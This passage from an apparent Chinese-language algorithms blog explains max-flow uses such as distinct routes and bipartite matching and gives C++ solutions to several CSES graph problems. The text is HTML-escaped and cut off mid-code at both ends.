&amp;&amp; dfs(i)){            g[rt][i]--, g[i][rt]++;            return 1;        }    }    return 0;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a][b] = g[b][a] = 1;    }    while(dfs(1)) memset(vis, 0, sizeof(vis)), ans++;    cout &lt;&lt; ans &lt;&lt; '\\n';    rep(i, 1, n){        rep(j, 1, n){            if((vis[i] ^ vis[j]) &amp;&amp; !g[i][j] &amp;&amp; g[j][i]) cout &lt;&lt; i sp j &lt;&lt; '\\n';        }    }    return 0;}\n\n最多不重複路徑 \n若是將每條路徑流量都設為 1，那麼就代表這條被走過之後就不能再走了，因此最終能有多少條路徑能從起點到終點，就會是最多不重複路徑的數量，也就會是最大流量。\n那應該怎麼找到路徑的順序呢？可以想想看找完最大流後的 Residual\nGraph，因為演算法會幫我們把走錯的路導正，除起點與終點外，每個節點都必定只有進入和出去各 1 的流量，所以只要從起點開始，不斷找 Residual\nCapacity 為 0 的邊，然後再從這條邊的終點找下一條 Residual\nCapacity 為 0 的邊，直到找到終點為止。\n最多不重複路徑の例題 \nCSES Distinct\nRoutes\n\nA game consists of n rooms and m teleporters. At the beginning of\neach day, you start in room 1 and you have to reach room n.\nYou can use each teleporter at most once during the game. How many days\ncan you play if you choose your routes optimally?\n\n解法：這題一樣把所有路徑的容量都設成 1，然後用 Ford–Fulkerson\nAlgorithm 找到最大流，然後就用前述方法即可找到各個實際路徑是怎麼走的了。\n&lt;summary&gt;程式碼&lt;/summary&gt;CSES Distinct Routes#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, ans = 0;int g[502][502];bool vis[502];vi go[502];bool dfs(int rt){    if(vis[rt]) return 0;    if(rt == n) return 1;    vis[rt] = 1;    rep(i, 1, n){        if(g[rt][i] &amp;&amp; dfs(i)) {            g[rt][i]--, g[i][rt]++;            return 1;        }    }    return 0;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a][b]++;        go[a].eb(b);    }    while(dfs(1)) memset(vis, 0, sizeof(vis)), ans++;    cout &lt;&lt; ans &lt;&lt; '\\n';    while(ans--){        vi path(1,1);        int s = 1;        while(s!=n){            for(int i : go[s])                if(!g[s][i] &amp;&amp; g[i][s]){                    g[i][s]=0;                    s=i;                    path.eb(i);                    break;                }        }        cout &lt;&lt; path.size() &lt;&lt; '\\n';        for(int i : path) cout &lt;&lt; i &lt;&lt; ' ';        cout &lt;&lt; '\\n';    }    return 0;}\n\n二分圖最大匹配 \n這個的做法是先兩個集合的點，各別連接一個 source 和 sink (見如果有好幾個 source 或 sink 怎麼辦？)，我們可以將圖分為四個區塊，如下圖：\nflowchart LR\nsubgraph BEGIN\ns\nend\nsubgraph LEFT\ndirection LR\na1\na2\na3\nend\nsubgraph RIGHT\ndirection LR\nb1\nb2\nb3\nend\nsubgraph END\nt\nend\ns --1--&gt; a1\ns --1--&gt; a2\ns --1--&gt; a3\na1 --1--&gt; b1\na1 --1--&gt; b2\na2 --1--&gt; b2\na3 --1--&gt; b3\na1 --1--&gt; b3\nb1 --1--&gt; t\nb2 --1--&gt; t\nb3 --1--&gt; t\n我們可以認定一條 \\(s\\) 流到 \\(t\\)\n的路徑就代表一個配對，並且因為 LEFT 的每個點流入量都是 1，RIGHT 的每個點流出量是 1，所以所有點配對時最多只能使用一次，因此最終能有多少條路徑能從起點到終點，就會是最大匹配的數量，也就會是最大流量，而找路徑的方法就如同最多不重複路徑一樣。\n二分圖最大匹配の例題 \nCSES School\nDance\n\nThere are n boys and m girls in a school. Next week a school dance\nwill be organized. A dance pair consists of a boy and a girl, and there\nare k potential pairs.\nYour task is to find out the maximum number of dance pairs and show how\nthis number can be achieved.\n\n解法：還是一樣把所有路徑的容量都設成 1，然後用 Ford–Fulkerson\nAlgorithm 找到最大流，然後就用前面講的方法轉換成匹配結果。\n&lt;summary&gt;程式碼&lt;/summary&gt;CSES School Dance#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, k, ans;int g[1003][1003];bool vis[1003];vi go[1003];bool dfs(int rt){    if(vis[rt]) return 0;    if(rt == 1001) return 1;    vis[rt] = 1;    rep(i, 1, 1001){        if(g[rt][i] &amp;&amp; dfs(i)){            g[rt][i]--, g[i][rt]++;            return 1;        }    }    return 0;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;    rep(i, 1, k){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[0][a] = g[a][b+500] = g[b+500][1001] = 1;        go[0].eb(a), go[a].eb(b+500), go[b+500].eb(1001);    }    while(dfs(0)) memset(vis, 0, sizeof(vis)), ans++;    cout &lt;&lt; ans &lt;&lt; '\\n';    while(ans--){        int a, b, s = 0;        while(s != 1001){            a=b, b=s;            for(int i : go[s])                 if(!g[s][i] &amp;&amp; g[i][s]){                    g[s][i]=1;                    s=i;                    break;                }        }        cout &lt;&lt; a sp b-500 &lt;&lt; '\\n';    }    return 0;}\n\n\n延伸閱讀（參考資料） \n\nCompetitive\nProgrammer’s Handbook, Chapter 20, Flows and cuts\nFord–Fulkerson\nAlgorithm\n演算法第 26 章 Maximum\nFlow\nOI Wiki -\n最大流\n\n","categories":["演算法","圖論"],"tags":["演算法","Flow"]},{"title":"CSES Graph Algorithms","url":"/CSES_Graph_Algorithms/","content":"CSES Graph Algorithms \nCSES Graph Algorithms 的 AC 程式碼\n\nCSES Problem Set\n我的 Profile\n我的程式們\nCounting Rooms \nCounting Rooms#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i,a,b) for(int i = a; i&lt;=b; i++)#define rev(i,a,b) for(int i = a; i&gt;=b; i--)#define tomax(a,b) (a)=max(a,b)#define tomin(a,b) (a)=min(a,b)#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0);using namespace std;int n, m, room=0;bool is_floor[1003][1003];void dfs(int i, int j){    if(!is_floor[i][j]) return;    is_floor[i][j]=0;    dfs(i+1,j), dfs(i-1,j), dfs(i,j+1), dfs(i,j-1);}signed main(){    ios;    cin &gt;&gt; n &gt;&gt; m;    char tmp;    memset(is_floor, 0, sizeof(is_floor));    rep(i, 1, n)        rep(j, 1, m)            cin&gt;&gt;tmp, is_floor[i][j]=(tmp=='.');    rep(i, 1, n)        rep(j, 1, m)            if(is_floor[i][j])                room++, dfs(i, j);    cout &lt;&lt; room &lt;&lt; '\\n';    return 0;}\nLabyrinth \nLabyrinth#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for(int i = a; i&lt;=b; ++i)#define rev(i, a, b) for(int i = a; i&gt;=b; --i)#define tomax(a, b) (a)=max((a),(b))#define tomin(a, b) (a)=min((a),(b))#define all(a) a.begin(), a.end()#define pob pop_back#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)using namespace std;int n, m;pii a, b;bool find_path = false;bool graph[1003][1003];queue&lt;pii&gt; q;vector&lt;char&gt; path;int dir[1003][1003];signed main(){    ios;    memset(graph, 0, sizeof(graph));    cin &gt;&gt; n &gt;&gt; m;    char tmp;    rep(i, 1, n)        rep(j, 1, m)            cin &gt;&gt; tmp, graph[j][i]=(tmp!='#'&amp;&amp;tmp!='A'),            a = (tmp=='A' ? make_pair(j,i) : a),            b = (tmp=='B' ? make_pair(j,i) : b);    q.push(a);    while(q.size()){        int x = q.front().F, y = q.front().S; q.pop();        if(x==b.F &amp;&amp; y==b.S){ find_path=true; break;}        if(graph[x-1][y]) dir[x-1][y]='L', graph[x-1][y]=0, q.push({x-1, y});        if(graph[x+1][y]) dir[x+1][y]='R', graph[x+1][y]=0, q.push({x+1, y});        if(graph[x][y-1]) dir[x][y-1]='U', graph[x][y-1]=0, q.push({x, y-1});        if(graph[x][y+1]) dir[x][y+1]='D', graph[x][y+1]=0, q.push({x, y+1});    }    if(!find_path){cout &lt;&lt; \"NO\\n\"; return 0;}    while(a!=b){        path.pb(dir[b.F][b.S]);        if(dir[b.F][b.S]=='L') b={b.F+1, b.S};        else if(dir[b.F][b.S]=='R') b={b.F-1, b.S};        else if(dir[b.F][b.S]=='U') b={b.F, b.S+1};        else if(dir[b.F][b.S]=='D') b={b.F, b.S-1};    }reverse(all(path));    cout &lt;&lt; \"YES\\n\" &lt;&lt; path.size() &lt;&lt; '\\n';    for(char i : path) cout &lt;&lt; i;    cout &lt;&lt; '\\n';    return 0;}\nBuilding Roads \nBuilding Roads#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for(int i = a; i&lt;=b; ++i)#define rev(i, a, b) for(int i = a; i&gt;=b; --i)#define tomax(a, b) (a)=max((a),(b))#define tomin(a, b) (a)=min((a),(b))#define all(a) a.begin(), a.end()#define pob pop_back#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)using namespace std;int bose[100005];int fb(int ch){    if(ch==bose[ch]) return ch;    return bose[ch]=fb(bose[ch]);}signed main(){    ios;    // minimum spanning tree    int n, m, connect=0;    cin &gt;&gt; n &gt;&gt; m;    vector&lt;pii&gt; E(m);    for(pii &amp;x : E) cin &gt;&gt; x.F &gt;&gt; x.S;    rep(i, 1, n) bose[i]=i;    for(pii path : E){        if(connect==0 || fb(path.F) != fb(path.S))            bose[fb(path.F)]=bose[fb(path.S)], connect++;    }cout &lt;&lt; n-1-connect &lt;&lt; '\\n';    rep(i, 2, n){        if(fb(i-1)!=fb(i))            bose[fb(i-1)]=bose[fb(i)], cout &lt;&lt; i-1 &lt;&lt; ' ' &lt;&lt; i &lt;&lt; '\\n';    }    return 0;}\nMessage Route \nMessage Route#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define pob pop_back#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)using namespace std;int n, m, tmp1, tmp2;int last_cpu[100005];vector&lt;int&gt; E[100005];vector&lt;int&gt; ans;signed main() {    ios;    // BFS    fill(last_cpu, last_cpu+100005, INT_MAX);    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m) cin &gt;&gt; tmp1 &gt;&gt; tmp2, E[tmp1].eb(tmp2), E[tmp2].eb(tmp1);    queue&lt;int&gt; q;    q.push(1); last_cpu[1]=1;    while(!q.empty()){        int cur = q.front();        q.pop();        for(int x : E[cur])            if(last_cpu[x]==INT_MAX) q.push(x), last_cpu[x]=cur;    }    if(last_cpu[n]!=INT_MAX){        while(n!=1){            ans.pb(n);            n=last_cpu[n];        }cout &lt;&lt; ans.size()+1 &lt;&lt; '\\n';        reverse(all(ans));        cout &lt;&lt; 1 &lt;&lt; ' ';        for(int x : ans) cout &lt;&lt; x &lt;&lt; ' ';    }else{        cout &lt;&lt; \"IMPOSSIBLE\\n\";    }    return 0;}\nBuilding Teams \nBuilding Teams#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vi vector&lt;int&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)vi E[100005];vi team;int n, m, tmp1, tmp2;bool build_team = true;void dfs(int r) {    int draw = team[r] % 2 + 1;    for (int i : E[r]) {        if (team[i] == 0)            team[i] = draw, dfs(i);        else if (team[i] == draw)            continue;        else {            build_team = false;            return;        }    }}signed main() {    ios;    // bipartite graph    cin &gt;&gt; n &gt;&gt; m;    team.resize(n + 1), team.assign(n + 1, 0);    rep(i, 1, m) {        cin &gt;&gt; tmp1 &gt;&gt; tmp2;        E[tmp1].eb(tmp2), E[tmp2].eb(tmp1);    }    rep(i, 1, n) {        if (team[i] == 0) team[i] = 1, dfs(i);    }    if (build_team) {        team.erase(team.begin());        for (int i : team) cout &lt;&lt; i &lt;&lt; ' ';    } else        cout &lt;&lt; \"IMPOSSIBLE\";    return 0;}\nRound Trip \nRound Trip#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vi vector&lt;int&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, min_l = INT_MAX, min_ls, min_le;vi E[100005];int lev[100005], parent[100005];bool vis[100005];void dfs(int u) {    if (vis[u]) return;    vis[u] = 1;    for (int i : E[u]) {        if (!vis[i])            lev[i] = lev[u] + 1, parent[i] = u, dfs(i);        else if(lev[u] &gt; lev[i] &amp;&amp; i != parent[u]){            int path = lev[u] - lev[i] + 2;            if (path &lt; min_l) min_l=path, min_ls = u, min_le = i;        }    }}signed main() {    ios;    int tmp1, tmp2;    memset(vis, 0, sizeof(vis));    memset(lev, 0, sizeof(lev));    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m) cin &gt;&gt; tmp1 &gt;&gt; tmp2, E[tmp1].eb(tmp2), E[tmp2].eb(tmp1);    rep(i, 1, n) dfs(i);    if(min_l == INT_MAX) cout &lt;&lt; \"IMPOSSIBLE\\n\";    else{        cout &lt;&lt; min_l &lt;&lt; '\\n';        tmp1 = min_ls;        rep(i, 2, min_l){            cout &lt;&lt; min_ls &lt;&lt; ' ';            min_ls = parent[min_ls];        }cout &lt;&lt; tmp1 &lt;&lt; '\\n';    }    return 0;}\nMonsters \nMonsters#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */// #define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)bool vis[1003][1003];bool vis_h[1003][1003];signed main() {    ios;    int n, m;    char g[1003][1003];    cin &gt;&gt; n &gt;&gt; m;    queue&lt;pair&lt;pii, bool&gt; &gt; pt;    int from[1003][1003];    bool ok = 0;    pair&lt;pii, bool&gt; a;    pii de;    int dir_x[5] = {1, 0, -1, 0}, dir_y[5] = {0, 1, 0, -1};    char dir[5] = {'D', 'R', 'U', 'L'};    rep(i, 0, n - 1) rep(j, 0, m - 1) {        cin &gt;&gt; g[i][j];        if (g[i][j] == '#') vis[i][j] = 1;        if (g[i][j] == 'M') pt.push({{i, j}, 0}), vis[i][j] = 1;        if (g[i][j] == 'A') a = {{i, j}, 1}, vis_h[i][j] = 1;    }    pt.push(a);    while (!pt.empty()) {        // 0 U, 1 R, 2 D, 3 L        auto x = pt.front();        pt.pop();        // cout &lt;&lt; x.F.F sp x.F.S &lt;&lt; '\\n';        if (!x.S) {            rep(i, 0, 3) {                int xx = x.F.F + dir_x[i], yy = x.F.S + dir_y[i];                if (!vis[xx][yy] &amp;&amp; xx &gt;= 0 &amp;&amp; xx &lt;= n - 1 &amp;&amp; yy &gt;= 0 &amp;&amp;                    yy &lt;= m - 1) {                    pt.push({{xx, yy}, 0});                    vis[xx][yy] = 1;                }            }        } else if (x.S &amp;&amp; (x.F.F == 0 || x.F.S == 0 || x.F.F == n - 1 ||                           x.F.S == m - 1)) {            // cout &lt;&lt; x.F.F sp x.F.S &lt;&lt; '\\n';            ok = 1;            de = {x.F.F, x.F.S};            break;        } else if (x.S) {            // cout &lt;&lt; x.F.F sp x.F.S &lt;&lt; '\\n';            // cout &lt;&lt; '\\n';            rep(i, 0, 3) {                if (!vis[x.F.F + dir_x[i]][x.F.S + dir_y[i]] &amp;&amp;                    !vis_h[x.F.F + dir_x[i]][x.F.S + dir_y[i]]) {                    pt.push({{x.F.F + dir_x[i], x.F.S + dir_y[i]}, 1});                    vis_h[x.F.F + dir_x[i]][x.F.S + dir_y[i]] = 1;                    from[x.F.F + dir_x[i]][x.F.S + dir_y[i]] = i;                }            }        }    }    if (!ok)        cout &lt;&lt; \"NO\\n\";    else {        cout &lt;&lt; \"YES\\n\";        vector&lt;char&gt; ans;        while (de.F != a.F.F || de.S != a.F.S) {            // cout &lt;&lt; de.F sp de.S &lt;&lt; '\\n';            int tmpF = de.F;            ans.eb(dir[from[de.F][de.S]]);            de.F -= dir_x[from[de.F][de.S]];            de.S -= dir_y[from[tmpF][de.S]];            // cout &lt;&lt; de.F sp de.S &lt;&lt; \"\\n\\n\";        }        cout &lt;&lt; ans.size() &lt;&lt; '\\n';        reverse(all(ans));        for (char i : ans) cout &lt;&lt; i;    }    return 0;}\nShortest Routes I \nShortest Routes I#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int dis[100005];vii g[100005];int n, m, a, b, c;bool vis[100005];signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m) cin &gt;&gt; a &gt;&gt; b &gt;&gt; c, g[a].eb(b, c);    priority_queue&lt;pii, vii, greater&lt;pii&gt;&gt; pq;    rep(i, 1, n) dis[i] = 1e18;    dis[1] = 0, pq.push({0, 1});    while (!pq.empty()) {        pii cur = pq.top();        pq.pop();        if (vis[cur.S]) continue;        vis[cur.S] = 1;        for (pii i : g[cur.S]) {            if (cur.F + i.S &lt; dis[i.F]) {                dis[i.F] = cur.F + i.S;                pq.push({dis[i.F], i.F});            }        }    }    rep(i, 1, n) cout &lt;&lt; dis[i] &lt;&lt; ' ';    return 0;}\nShortest Routes II \nShortest Routes II#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, q, a, b, c;int dp[502][502];signed main() {    ios;    rep(i, 0, 500) rep(j, 0, 500) dp[i][j] = 1e18 * (i!=j);    cin &gt;&gt; n &gt;&gt; m &gt;&gt; q;    rep(i, 1, m) {        cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;        dp[a][b] = dp[b][a] = min(dp[a][b], c);    }    rep(k, 1, n) rep(i, 1, n) rep(j, 1, n) tomin(dp[i][j], dp[i][k] + dp[k][j]);    while (q--) {        cin &gt;&gt; a &gt;&gt; b;        if (dp[a][b] == 1e18)            cout &lt;&lt; \"-1\\n\";        else            cout &lt;&lt; dp[a][b] &lt;&lt; '\\n';    }    return 0;}\nHigh Score \nHigh Score#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, a, b, x;vector&lt;pair&lt;pii, int&gt;&gt; g;vi hg[3005], rg[3005];int dis[3005];bool bad = false;bool vis[3005], rvis[3005];void dfs(int rt){    if(vis[rt]) return;    vis[rt] = 1;    for(int i : hg[rt]) dfs(i);}void rdfs(int rt){    if(rvis[rt]) return;    rvis[rt] = 1;    for(int i : rg[rt]) rdfs(i);}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m) {        cin &gt;&gt; a &gt;&gt; b &gt;&gt; x;        g.pb({{a, b}, x});        hg[a].eb(b), rg[b].eb(a);    }    dfs(1), rdfs(n);    dis[1] = 0;    rep(i, 2, n) dis[i] = -1e18;    rep(j, 1, n) {        for (auto i : g) {            if (dis[i.F.S] &lt; dis[i.F.F] + i.S) {                dis[i.F.S] = dis[i.F.F] + i.S;                if (j == n &amp;&amp; vis[i.F.S] &amp;&amp; rvis[i.F.S]) bad = 1;            }        }    }    if (bad)        cout &lt;&lt; \"-1\\n\";    else        cout &lt;&lt; dis[n] &lt;&lt; '\\n';    return 0;}\nSPFA \nHigh Score - SPFA#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, a, b, x;vii g[3005];vi hg[3005], rg[3005];int dis[3005], cnt[3005];bool bad = false;bool vis[3005], rvis[3005];bool inq[3005];void dfs(int rt) {    if (vis[rt]) return;    vis[rt] = 1;    for (int i : hg[rt]) dfs(i);}void rdfs(int rt) {    if (rvis[rt]) return;    rvis[rt] = 1;    for (int i : rg[rt]) rdfs(i);}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m) {        cin &gt;&gt; a &gt;&gt; b &gt;&gt; x;        g[a].eb(b, x);        hg[a].eb(b), rg[b].eb(a);    }    dfs(1), rdfs(n);    queue&lt;int&gt; q;    rep(i, 1, n) dis[i] = -1e18;    dis[1] = 0, q.push(1);    bool bye = false;    while (!q.empty() &amp;&amp; !bye) {        int cur = q.front();        q.pop();        inq[cur] = 0;        for (auto i : g[cur]) {            if (dis[i.F] &lt; dis[cur] + i.S) {                dis[i.F] = dis[cur] + i.S;                if (!inq[i.F]) inq[i.F] = 1, q.push(i.F);                cnt[i.F]++;                if (cnt[i.F] &gt;= n &amp;&amp; vis[i.F] &amp;&amp; rvis[i.F]) {                    bad = 1;                    bye = true;                    break;                }                if (cnt[i.F] &gt;= 2 * n) {                    bye = 1;                    break;                }            }        }    }    if (bad)        cout &lt;&lt; \"-1\\n\";    else        cout &lt;&lt; dis[n] &lt;&lt; '\\n';    return 0;}\nFlight Discount \nFlight Discount#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, a, b, x;vii g[100005], rg[100005];int dis[100005], rdis[100005];bool vis[100005], rvis[100005];signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m) cin &gt;&gt; a &gt;&gt; b &gt;&gt; x, g[a].eb(b, x), rg[b].eb(a, x);    priority_queue&lt;pii, vii, greater&lt;pii&gt;&gt; pq;    pq.push({0, 1}), dis[1] = 0;    rep(i, 2, n) dis[i] = 1e18;    while (!pq.empty()) {        pii cur = pq.top();        pq.pop();        if (vis[cur.S]) continue;        vis[cur.S] = 1;        for (pii i : g[cur.S]) {            if (cur.F + i.S &lt; dis[i.F]) {                dis[i.F] = cur.F + i.S;                pq.push({dis[i.F], i.F});            }        }    }    pq.push({0, n}), rdis[n] = 0;    rep(i, 1, n-1) rdis[i] = 1e18;    while (!pq.empty()) {        pii cur = pq.top();        pq.pop();        if (rvis[cur.S]) continue;        rvis[cur.S] = 1;        for (pii i : rg[cur.S]) {            if (cur.F + i.S &lt; rdis[i.F]) {                rdis[i.F] = cur.F + i.S;                pq.push({rdis[i.F], i.F});            }        }    }    int ans = 1e18;    rep(i, 1, n) {        for (pii j : g[i]) tomin(ans, dis[i] + j.S / 2 + rdis[j.F]);    }    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nCycle Finding \nCycle Finding#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define 